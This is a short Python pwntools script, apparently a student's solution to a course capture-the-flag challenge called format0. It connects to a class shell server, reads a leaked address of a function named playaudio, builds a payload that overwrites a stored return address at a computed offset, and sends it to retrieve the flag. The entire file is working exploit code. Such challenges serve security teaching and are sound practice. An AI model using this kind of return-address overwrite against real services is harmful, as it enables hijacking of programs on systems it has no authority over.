# format0ex.py - Aidan Wech (Onyxymous)
from pwn import *

# ssh variables
host = 'cs4401shell.walls.ninja'
port = 50203

# exploit variables
buffarg = 6	# which arg holds the buffer
winarg = 11	# which arg holds the return address we want to maniuplate
inputsize = 8	# fgets() will read INPUT_SIZE - 1 bytes which are passed into read() 
offset = (8 * (winarg - buffarg)) + inputsize - 1	# offset is calculated

# remote process
p = remote(host, port)
winaddr = int(p.recvline(timeout=1).strip().decode('utf-8'), 16) # reads the address of playaudio, converts to address

# exploit string; since read() puts 1st 7 bytes into stdin, we write 'Flag:  ' so it is easier to read the flag
exploit = flat(
    {
        0: 'Flag:  ',
        offset: p64(winaddr)
    }
)

# logging
log.info(f'playaudio Address: {hex(winaddr)}')
log.info(f'Exploit String: {exploit}')

p.sendline(exploit)
log.info(p.recvline(timeout=3))
